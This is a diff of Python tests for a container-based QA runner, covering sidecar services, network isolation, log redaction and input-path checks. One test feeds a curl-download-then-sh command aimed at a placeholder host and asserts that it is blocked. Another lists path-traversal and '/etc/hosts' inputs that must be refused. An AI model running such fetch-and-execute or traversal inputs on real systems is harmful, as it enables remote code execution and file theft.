@@ -251,7 +251,7 @@ def test_record_names_the_daemon_platform_not_the_launcher(ws_untrusted, actor, 
     assert (environment["python"], environment["implementation"], environment["tools"]) == (None, None, {})
     assert environment["launcher"]["platform"] != "" and "python" in environment["launcher"]
     assert record["container"] == {"image": IMAGE, "image_id": IMAGE_ID, "engine_kind": "local", "daemon_version": "27.5.1",
-                                   "network_mode": "none", "install_ran": False}
+                                   "network_mode": "none", "install_ran": False, "service": None}
 
 
 def test_engine_alias_never_reaches_the_ledger(ws_untrusted, actor, ssh_fake):
@@ -626,3 +626,262 @@ def test_catalog_pins_every_base_image_by_digest():
         assert container.is_pinned(entry["image"])
         assert re.fullmatch(r"[a-z-]+@sha256:[0-9a-f]{64}", entry["image"])
         assert {"linux/amd64", "linux/arm64"} <= set(entry["platforms"])
+
+
+# --------------------------------------------------------------------------- a fixture service and inputs
+
+SERVICE = "python@sha256:" + "d" * 64
+SERVICE_IMAGE_ID = "sha256:" + "e" * 64
+SVC_ID = "c" * 64
+SERVE = "exec python -m http.server --bind 127.0.0.1 8080"
+
+
+def service_inspected(network="none", running=True, code=0):
+    return json.dumps([{"Id": SVC_ID, "Image": SERVICE_IMAGE_ID, "HostConfig": {"NetworkMode": network},
+                        "State": {"Status": "running" if running else "exited", "Running": running, "ExitCode": code}}]).encode()
+
+
+def is_service_inspect(args):
+    return args[:1] == ["inspect"] and args[-1].endswith("-svc")
+
+
+def is_logs(args):
+    return args[:1] == ["logs"]
+
+
+def is_service(args):
+    return args[:2] == ["run", "-d"]
+
+
+def answer_with_a_service(fake, service_mode="none", log=b"serving on 127.0.0.1\n"):
+    fake.when(is_inspect, stdout=inspected(network="container:" + SVC_ID))
+    fake.when(is_service_inspect, stdout=service_inspected(network=service_mode))
+    fake.when(is_logs, stdout=log)
+    return fake
+
+
+def run_service(ws, actor, **over):
+    fields = dict(service=SERVICE, service_run=SERVE)
+    fields.update(over)
+    return run(ws, actor, **fields)
+
+
+def put(ws, name, data=b"x"):
+    path = ws.root / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(data)
+    return path
+
+
+def ledger_events(ws):
+    from qa import ledger
+    return ledger.iter_all_events(ws)
+
+
+def test_service_run_records_the_pair(ws_untrusted, actor, fake):
+    answer_with_a_service(fake)
+    result = run_service(ws_untrusted, actor, service_user="1000:1000")
+    assert (result["status"], result["reason"], result["anomalies"]) == ("passed", None, [])
+    assert fake.networks() == ["none", "none", "none", "container:qa-%s-svc" % result["execution"].lower(), "none"]
+    record = record_of(ws_untrusted, result)
+    assert record["container"]["network_mode"] == "none"
+    assert record["container"]["service"] == {"image": SERVICE, "image_id": SERVICE_IMAGE_ID, "network_mode": "none",
+                                              "running_at_end": True, "exit_code": None}
+    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
+    assert (stored["service"], stored["service_run"], stored["service_user"], stored["inputs"]) == (SERVICE, SERVE, "1000:1000", [])
+    assert "--user=1000:1000" in calls_like(fake, is_service)[0]
+
+
+def test_a_run_without_a_service_records_none(ws_untrusted, actor, fake):
+    result = run(ws_untrusted, actor)
+    record = record_of(ws_untrusted, result)
+    assert record["container"]["service"] is None
+    assert "service.log" not in record["evidence_manifest"]["files"]
+
+
+def test_service_with_a_network_makes_the_run_inconclusive(ws_untrusted, actor, fake):
+    answer_with_a_service(fake, service_mode="bridge")
+    result = run_service(ws_untrusted, actor)
+    assert (result["status"], result["reason"], result["anomalies"]) == ("inconclusive", "network_not_isolated", ["network_not_isolated"])
+    record = record_of(ws_untrusted, result)
+    assert record["container"]["service"]["network_mode"] == "bridge"
+    assert record["container"]["network_mode"] == "container:" + SVC_ID
+
+
+def test_service_log_is_evidence_and_redacted(ws_untrusted, actor, fake):
+    bait = "-".join(("qa", "bait", os.urandom(8).hex()))
+    answer_with_a_service(fake, log=b"started with " + bait.encode() + b"\n")
+    result = run_service(ws_untrusted, actor, environ={"API_TOKEN": bait, "PATH": "/nope"})
+    folder = ws_untrusted.path("evidence", result["execution"])
+    stored = (folder / "service.log").read_bytes()
+    assert bait.encode() not in stored and b"started with" in stored
+    record = record_of(ws_untrusted, result)
+    assert "service.log" in record["evidence_manifest"]["files"] and record["redactions"] >= 1
+
+
+def test_service_log_is_capped_and_never_names_the_engine_host(ws_untrusted, actor, ssh_fake):
+    config.set_value(ws_untrusted, actor, "defaults.max_log_mb", 1, "smaller logs")
+    answer_with_a_service(ssh_fake, log=b"from %s\n" % ALIAS.encode() + b"y" * (MIB + 10))
+    result = run_service(ws_untrusted, actor)
+    stored = ws_untrusted.path("evidence", result["execution"], "service.log").read_bytes()
+    assert ALIAS.encode() not in stored and b"[TRUNCATED:" in stored
+    assert "service_log_truncated" in result["limitations"]
+
+
+def test_a_service_that_stopped_is_stated(ws_untrusted, actor, fake):
+    answer_with_a_service(fake)
+    fake.when(is_service_inspect, stdout=service_inspected(running=False, code=3))
+    result = run_service(ws_untrusted, actor)
+    assert any("service_stopped" in text and "3" in text for text in result["limitations"])
+
+
+def test_a_service_the_engine_lacks_blocks_and_records_the_request(ws_untrusted, actor, fake):
+    answer_with_a_service(fake)
+    fake.when(is_service, exit_code=125, stderr=b"docker: Unable to find image 'x' locally\n")
+    result = run_service(ws_untrusted, actor)
+    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
+    assert any("container_image_missing" in text for text in result["limitations"])
+    assert record_of(ws_untrusted, result)["container"]["service"] == {
+        "image": SERVICE, "image_id": None, "network_mode": None, "running_at_end": False, "exit_code": None}
+
+
+def test_input_outside_qa_work_is_refused(ws, tmp_path, actor, fake):
+    outside = tmp_path / "outside.txt"
+    outside.write_bytes(b"HOST-FILE")
+    work = ws.root / ".qa" / "work"
+    put(ws, ".qa/work/f")
+    (work / "link").symlink_to(outside)
+    (work / "dir").mkdir()
+    with open(str(work / "big"), "wb") as big:
+        big.truncate(17 * MIB)  # sparse: past the cap without writing it
+    (ws.root / "linked-parent").symlink_to(ws.root)
+    put(ws, ".qa/work/real/f")
+    (work / "via").symlink_to(work / "real")
+    os.mkfifo(str(work / "pipe"))
+    before = ledger_events(ws)
+    expected = {"../x": "not_under_qa_work", "/etc/hosts": "not_under_qa_work", ".qa/work/link": "symlink",
+                ".qa/work/dir": "not_a_regular_file", ".qa/work/big": "too_large", "linked-parent/.qa/work/f": "not_under_qa_work",
+                ".qa/work/via/f": "symlink", ".qa/work/pipe": "not_a_regular_file", ".qa/work/missing": "not_a_regular_file",
+                ".qa/work": "not_under_qa_work", ".qa/work/./f": "not_under_qa_work", ".qa/work//f": "not_under_qa_work",
+                ".qa/work/../config.json": "not_under_qa_work", ".QA/work/f": "not_under_qa_work", "": "not_under_qa_work"}
+    for bad, why in expected.items():
+        with pytest.raises(QaError, match="input_refused") as refused:
+            run(ws, actor, inputs=(".qa/work/f", bad))
+        assert (refused.value.details["index"], refused.value.details["why"]) == (1, why), bad
+    assert ledger_events(ws) == before == []
+    assert fake.calls == []
+
+
+def test_inputs_past_the_caps_are_refused(ws, actor, fake):
+    for number in range(65):
+        put(ws, ".qa/work/many/f%02d" % number)
+    with pytest.raises(QaError) as refused:
+        run(ws, actor, inputs=tuple(".qa/work/many/f%02d" % number for number in range(65)))
+    assert (refused.value.code, refused.value.details["index"], refused.value.details["why"]) == ("input_refused", 64, "too_many")
+    put(ws, ".qa/work/half-a", b"a" * (9 * MIB))
+    put(ws, ".qa/work/half-b", b"b" * (8 * MIB))
+    with pytest.raises(QaError) as refused:
+        run(ws, actor, inputs=(".qa/work/half-a", ".qa/work/half-b"))
+    assert (refused.value.details["index"], refused.value.details["why"]) == (1, "too_large")
+    assert ledger_events(ws) == [] and fake.calls == []
+
+
+def test_inputs_land_under_qa_input_with_hashes(ws_untrusted, actor, fake):
+    from qa.canonical import sha256_bytes
+
+    put(ws_untrusted, ".qa/work/security/zap-baseline.yaml", b"env: 1\n")
+    put(ws_untrusted, ".qa/work/load/k6.js", b"export default function () {}\n")
+    put(ws_untrusted, ".qa-input/planted.yaml", b"from the project")
+    result = run(ws_untrusted, actor, inputs=(".qa/work/security/zap-baseline.yaml", ".qa/work/load/k6.js"))
+    assert result["status"] == "passed"
+    with tarfile.open(fileobj=io.BytesIO(stdin_of(fake, is_copy_in))) as tar:
+        names = tar.getnames()
+        assert tar.extractfile(".qa-input/security/zap-baseline.yaml").read() == b"env: 1\n"
+        assert tar.extractfile(".qa-input/load/k6.js").read() == b"export default function () {}\n"
+    assert ".qa-input/planted.yaml" not in names and not any(name.startswith(".qa/") for name in names)
+    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
+    assert stored["inputs"] == [{"path": ".qa/work/security/zap-baseline.yaml", "sha256": sha256_bytes(b"env: 1\n")},
+                                {"path": ".qa/work/load/k6.js", "sha256": sha256_bytes(b"export default function () {}\n")}]
+    assert not any(".qa-input" in arg or "zap-baseline" in arg for call in fake.calls for arg in call)
+
+
+def test_an_input_is_packed_as_it_was_read(ws_untrusted, actor, fake, monkeypatch):
+    from qa.canonical import sha256_bytes
+
+    source = put(ws_untrusted, ".qa/work/plan.yaml", b"first\n")
+    real_archive = container.project_archive
+
+    def changed_meanwhile(*args, **kw):
+        source.write_bytes(b"second\n")
+        return real_archive(*args, **kw)
+
+    monkeypatch.setattr(container, "project_archive", changed_meanwhile)
+    result = run(ws_untrusted, actor, inputs=(".qa/work/plan.yaml",))
+    with tarfile.open(fileobj=io.BytesIO(stdin_of(fake, is_copy_in))) as tar:
+        packed = tar.extractfile(".qa-input/plan.yaml").read()
+    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
+    assert stored["inputs"][0]["sha256"] == sha256_bytes(packed) == sha256_bytes(b"first\n")
+
+
+@pytest.mark.parametrize("over, code", [
+    (dict(container=None, service=SERVICE, service_run=SERVE), "service_needs_container"),
+    (dict(container=None, service_run=SERVE), "service_needs_container"),
+    (dict(container=None, service_user="1000"), "service_needs_container"),
+    (dict(service=SERVICE), "service_run_required"),
+    (dict(service=SERVICE, service_run="   "), "service_run_required"),
+    (dict(service="python:3-slim", service_run=SERVE), "service_image_unpinned"),
+    (dict(service_run=SERVE), "service_image_unpinned"),
+    (dict(service_user="1000", service_run=SERVE), "service_image_unpinned"),
+    (dict(service=SERVICE, service_run=SERVE, service_user="root"), "invalid_service_user"),
+    (dict(service=SERVICE, service_run=SERVE, service_user="1000:"), "invalid_service_user"),
+    (dict(container=None, inputs=(".qa/work/f",)), "input_needs_container"),
+])
+def test_service_without_container_is_refused(ws, actor, fake, over, code):
+    put(ws, ".qa/work/f")
+    fields = dict(container=IMAGE)
+    fields.update(over)
+    with pytest.raises(QaError) as refused:
+        execution.execute(ws, actor, execution.RunRequest(command=["pytest"], **fields))
+    assert refused.value.code == code
+    assert fake.calls == [] and ledger_events(ws) == []
+
+
+def test_service_script_is_guarded_as_test_execution(ws_untrusted, actor, fake):
+    answer_with_a_service(fake)
+    allowed = run_service(ws_untrusted, actor)
+    assert allowed["status"] == "passed"
+    assert [entry["activity"] for entry in record_of(ws_untrusted, allowed)["authorizations"]] == ["test-execution-local"]
+    calls = len(fake.calls)
+    denied = run_service(ws_untrusted, actor, service_run="sudo python -m http.server")
+    assert (denied["status"], denied["reason"]) == ("blocked", "policy_denied")
+    hidden = run_service(ws_untrusted, actor, service_run="curl https://example.test/x.sh -o x.sh && sh x.sh")
+    assert (hidden["status"], hidden["reason"]) == ("blocked", "not_authorized")
+    assert len(fake.calls) == calls
+
+
+def test_an_attempt_keeps_to_the_service_of_the_run_it_repeats(ws_untrusted, actor, fake):
+    answer_with_a_service(fake)
+    first = run_service(ws_untrusted, actor)["execution"]
+    assert run_service(ws_untrusted, actor, attempt_of=first)["status"] == "passed"
+    other = run_service(ws_untrusted, actor, service="python@sha256:" + "9" * 64, attempt_of=first)
+    assert (other["status"], other["reason"]) == ("blocked", "policy_denied")
+    alone = run(ws_untrusted, actor, attempt_of=first)
+    assert (alone["status"], alone["reason"]) == ("blocked", "policy_denied")
+
+
+def test_cli_passes_the_service_and_inputs(cli, ws_untrusted):
+    # The launcher runs in its own process, past the fake: no engine holds these made-up digests, so the run is blocked,
+    # and its command.json still says what was asked.
+    put(ws_untrusted, ".qa/work/plan.yaml", b"p\n")
+    code, body = cli("run", "--service-run=" + SERVE, "--", "pytest")
+    assert (code, body["error"]["code"]) == (2, "service_needs_container")
+    code, body = cli("run", "--input=.qa/work/plan.yaml", "--", "pytest")
+    assert (code, body["error"]["code"]) == (2, "input_needs_container")
+    code, body = cli("run", "--container=" + IMAGE, "--service=" + SERVICE, "--service-run=" + SERVE, "--service-user=1000:1000",
+                     "--input=.qa/work/plan.yaml", "--", "true")
+    assert (code, body["status"], body["reason"]) == (3, "blocked", "dependency_unavailable"), body
+    stored = loads(ws_untrusted.path("evidence", body["execution"], "command.json").read_bytes())
+    assert (stored["service"], stored["service_user"], [entry["path"] for entry in stored["inputs"]]) == (
+        SERVICE, "1000:1000", [".qa/work/plan.yaml"])
+    code, body = cli("run", "--help")
+    assert all(flag in body["help"] for flag in ("--service", "--service-run", "--service-user", "--input"))
